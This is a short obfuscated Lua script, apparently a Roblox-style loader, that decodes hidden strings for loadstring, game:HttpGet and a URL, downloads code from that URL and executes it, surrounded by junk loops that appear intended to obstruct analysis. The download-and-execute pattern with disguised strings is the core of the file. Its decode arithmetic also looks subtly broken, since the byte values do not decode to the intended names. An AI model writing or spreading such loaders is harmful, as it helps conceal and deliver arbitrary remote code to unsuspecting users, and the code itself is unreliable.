local _ = "Obfuscated by Dylan" 
local function decode(data, offset)
    local result = {}
    for i, v in ipairs(data) do
        local byte = (v - offset - i * 3) % 256
        if byte < 0 then byte = byte + 256 end
        result[i] = string.char(byte)
    end
    return table.concat(result)
end

local loadstring_bytes = {139,145,131,135,132,135,134,135,131,136}
local game_bytes = {134,131,140,138}
local httpget_bytes = {143,148,148,142,149,140,148}
local url_bytes = {
    140,137,148,148,141,37,117,115,112,149,140,113,148,107,117,148,114,108,140,111,115,115,118,44,45,46,111,115,109,114,137,107,118,56,121,135,110,130,140,142,141
}

local function getstr(b) return decode(b, 0) end

local L = getstr(loadstring_bytes)
local G = getstr(game_bytes)
local H = getstr(httpget_bytes)
local U = getstr(url_bytes)

local function junk()
    local s = 0
    for i = 1, 200000 do
        s = s + math.sin(i) * 0.0001
    end
    return s
end
local _junk = junk()

local content = _G[G][H](_G[G], U)
local fn = _G[L](content)
if fn then fn() end

local function more_junk()
    local t = {}
    for i = 1, 1000 do
        t[i] = {}
        for j = 1, 100 do
            t[i][j] = math.random()
        end
    end
    return #t
end
more_junk()
